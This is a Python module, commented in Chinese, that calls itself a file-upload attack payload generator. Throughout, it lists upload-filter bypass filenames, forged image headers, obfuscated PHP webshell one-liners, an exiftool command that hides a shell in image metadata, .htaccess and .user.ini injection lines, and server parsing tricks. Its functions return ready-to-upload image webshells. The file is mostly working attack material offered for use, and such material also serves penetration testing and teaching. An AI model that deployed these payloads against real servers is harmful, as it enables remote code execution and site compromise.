"""文件上传攻击 Payload 生成器.

覆盖:
    - 后缀名绕过 (黑名单/空格点/NTFS流/截断/超长)
    - Content-Type & 文件头伪造
    - 图片马内容绕过 (注释/短标签/编码/拼接)
    - 服务端解析漏洞 (Nginx/Apache/IIS)
    - 高级技巧 (.htaccess/.user.ini/条件竞争/二次渲染)
"""
from typing import List, Dict


# ═══════════════════════════════════════════════════════════
#  后缀名绕过
# ═══════════════════════════════════════════════════════════

EXT_BYPASS: Dict[str, List[str]] = {
    "黑名单未覆盖后缀": [
        "php3", "php4", "php5", "php7", "php8",
        "phtml", "pht", "phps", "phar", "php.",
        "shtml", "phtm", "pgif",
    ],
    "大小写混合": [
        "pHp", "Php", "pHp5", "pHtMl",
        "PhP", "PHP", "pHp.",
    ],
    "多后缀组合": [
        "shell.php.jpg", "shell.php.png",
        "shell.php.gif", "shell.php.jpeg",
        "shell.php%00.jpg",
    ],
    "空格/点技巧 (Win)": [
        "shell.php ", "shell.php .",
        "shell.php. .", "shell.php. . .",
        "Windows 后置空格+点 → 自动去除",
    ],
    "NTFS 数据流 (Win)": [
        "shell.php::$DATA",
        "shell.php.jpg::$DATA",
        "shell.php:1.jpg",
    ],
    "路径截断": [
        "shell.php%00.jpg", "shell.php\\0.jpg",
        "shell.php/../shell.jpg",
        "PHP < 5.3.4 %00 截断有效",
    ],
    "超长后缀": [
        "shell.php..............................................................jpg",
        "shell.php%00.........................................jpg",
    ],
}


# ═══════════════════════════════════════════════════════════
#  Content-Type & 文件头伪造
# ═══════════════════════════════════════════════════════════

MIME_HEADER_FAKE: Dict[str, Dict[str, str]] = {
    "image/jpeg": {
        "Content-Type": "image/jpeg",
        "文件头hex": "FFD8FFE0", "文本头": "ÿØÿà",
    },
    "image/png": {
        "Content-Type": "image/png",
        "文件头hex": "89504E470D0A1A0A", "文本头": "PNG",
    },
    "image/gif": {
        "Content-Type": "image/gif",
        "文件头hex": "4749463839", "文本头": "GIF89a",
    },
    "image/bmp": {
        "Content-Type": "image/bmp",
        "文件头hex": "424D", "文本头": "BM",
    },
}


# ═══════════════════════════════════════════════════════════
#  图片马 — 内容绕过
# ═══════════════════════════════════════════════════════════

CONTENT_BYPASS: Dict[str, List[str]] = {
    "注释混淆": [
        "<?php /*gif89a*/ eval($_POST[1]); ?>",
        "<?php //GIF89a\\neval($_POST[1]); ?>",
        "GIF89a<?php eval($_POST[1]); ?>",
    ],
    "短标签变形": [
        "<?=eval($_POST[1]);?>",
        "<?=system($_REQUEST['c']);?>",
        "<% eval(request(1)); %>",
        "<script language='php'>eval($_POST[1]);</script>",
    ],
    "函数名变形": [
        "<?php passthru($_GET[1]); ?>",
        "<?php shell_exec($_POST[1]); ?>",
        "<?php proc_open('/bin/sh', [], $p); ?>",
    ],
    "字符串拼接绕过": [
        "<?php $a='ev'.'al'; $a($_POST[1]); ?>",
        "<?php $b='sys'.'tem'; $b('id'); ?>",
    ],
    "编码函数绕过": [
        "<?php $a=base64_decode('ZXZhbA=='); $a($_POST[1]); ?>",
        "<?php eval(gzinflate(base64_decode('压缩后'))); ?>",
        "<?php eval(str_rot13('riny($_CBFG[1]);')); ?>",
    ],
    "无函数一句话": [
        "<?php $_POST['_']($_POST['__']); ?>",
        "<?php ${'_POST'}{'_'}(${'_POST'}{'__'}); ?>",
        "<?php $$a=$_POST['_']; $$b=$_POST['__']; $$a($$b); ?>",
    ],
    "图片EXIF藏马": [
        "exiftool -Comment='<?=eval($_POST[1]);?>' image.jpg",
        "将 shell 写入图片 EXIF Comment 字段",
    ],
}


# ═══════════════════════════════════════════════════════════
#  服务端解析漏洞
# ═══════════════════════════════════════════════════════════

PARSE_VULN: Dict[str, List[Dict[str, str]]] = {
    "Nginx 解析": [
        {"name": "路径解析", "tip": "1.jpg/1.php → 当 PHP 执行", "eg": "上传 1.jpg → 访问 /upload/1.jpg/1.php"},
        {"name": "%00 截断", "tip": "1.php%00.jpg", "eg": "上传 shell.php%00.jpg → 解析为 PHP"},
    ],
    "Apache 解析": [
        {"name": "多后缀从后往前", "tip": "1.php.xxx.abc", "eg": "上传 shell.php.xxx → Apache 从右往左匹配 .php"},
        {"name": ".htaccess 覆盖", "tip": "AddType application/x-httpd-php .jpg", "eg": "上传 .htaccess: AddHandler php5-script .jpg"},
    ],
    "IIS 解析": [
        {"name": "分号解析", "tip": "1.asp;.jpg", "eg": "上传 shell.asp;.jpg → IIS 解析为 asp"},
        {"name": ".cer/.asa", "tip": "特殊扩展名", "eg": "上传 shell.cer → IIS 解析为 asp"},
    ],
}


# ═══════════════════════════════════════════════════════════
#  高级绕过技巧
# ═══════════════════════════════════════════════════════════

ADVANCED_BYPASS: Dict[str, List[Dict[str, str]]] = {
    "条件竞争": [
        {"name": "上传即访问", "tip": "上传 PHP → 在安全检查删除前抢访问"},
        {"name": "并发竞争", "tip": "多线程同时上传+访问, 利用时间窗口"},
    ],
    ".htaccess 注入": [
        {"name": "全部当 PHP 执行", "tip": "SetHandler application/x-httpd-php"},
        {"name": "指定后缀", "tip": "AddType application/x-httpd-php .jpg"},
        {"name": "包含配置文件", "tip": "php_value auto_prepend_file shell.jpg"},
    ],
    ".user.ini 注入": [
        {"name": "自动前置文件", "tip": "auto_prepend_file=1.jpg", "eg": "所有 PHP 请求自动包含你的图片马"},
        {"name": "自动后置文件", "tip": "auto_append_file=1.jpg"},
    ],
    "二次渲染绕过": [
        {"name": "分析渲染后保留的字节", "tip": "上传正常图→下载→grep 原始字节→把 shell 塞在不变区域"},
    ],
    "文件包含 + 上传": [
        {"name": "lfi 包含上传文件", "tip": "上传 shell.jpg → LFI: ?file=/uploads/shell.jpg"},
        {"name": "Phar 反序列化 + 上传", "tip": "phar://uploads/test.jpg → 触发反序列化"},
    ],
    "SVG XSS": [
        {"name": "上传 SVG 触发 XSS", "tip": "<svg><script>alert(1)</script></svg>"},
        {"name": "SVG 包含外部实体", "tip": "SVG XXE 读取文件"},
    ],
}


def get_ext_bypass(category: str = "") -> dict:
    if category and category in EXT_BYPASS:
        return {category: EXT_BYPASS[category]}
    return EXT_BYPASS


def get_mime_fake(filetype: str = "") -> dict:
    if filetype and filetype in MIME_HEADER_FAKE:
        return {filetype: MIME_HEADER_FAKE[filetype]}
    return MIME_HEADER_FAKE


def get_content_bypass() -> dict:
    return CONTENT_BYPASS


def get_parse_vuln(server: str = "") -> dict:
    if server and server in PARSE_VULN:
        return {server: PARSE_VULN[server]}
    return PARSE_VULN


def get_advanced_bypass() -> dict:
    return ADVANCED_BYPASS


def generate_htaccess(suffix: str = ".jpg") -> str:
    return f"AddType application/x-httpd-php {suffix}"


def generate_userini(filename: str = "1.jpg") -> str:
    return f"auto_prepend_file={filename}"


def generate_image_shell(shell_type: str = "eval") -> str:
    payloads = {
        "eval": 'GIF89a<?=eval($_POST[1]);?>',
        "system": 'GIF89a<?=system($_GET["c"]);?>',
        "one_liner": 'GIF89a<?php $_POST["_"]($_POST["__"]);?>',
    }
    return payloads.get(shell_type, payloads["eval"])
